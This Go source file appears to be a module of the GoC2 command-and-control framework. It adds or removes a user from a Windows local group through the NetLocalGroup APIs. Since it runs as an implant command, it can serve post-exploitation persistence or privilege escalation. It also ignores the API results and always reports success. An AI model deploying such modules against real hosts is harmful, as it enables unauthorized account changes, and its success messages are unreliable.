package addusertogroup

import (
	"fmt"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func AddUserToGroup(args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("Not Enough Args")
	}
	user := args[0]
	group := args[1]
	member := winapi.LOCALGROUP_MEMBERS_INFO_3{}
	uptr, err := windows.UTF16PtrFromString(user)
	if err != nil {
		return "", err
	}
	member.Lgrmi3_domainandname = uptr
	winapi.NetLocalGroupAddMembers(group, 3, (*uintptr)(unsafe.Pointer(&member)), 1)
	return fmt.Sprintf("[+] Added %s to %s", user, group), nil
}

func RemoveUserFromGroup(args []string) (string, error) {
	if len(args) < 2 {
		return "", fmt.Errorf("Not Enough Args")
	}
	user := args[0]
	group := args[1]
	member := winapi.LOCALGROUP_MEMBERS_INFO_3{}
	uptr, err := windows.UTF16PtrFromString(user)
	if err != nil {
		return "", err
	}
	member.Lgrmi3_domainandname = uptr
	winapi.NetLocalGroupDelMembers(group, 3, (*uintptr)(unsafe.Pointer(&member)), 1)
	return fmt.Sprintf("[+] Removed %s from %s", user, group), nil
}
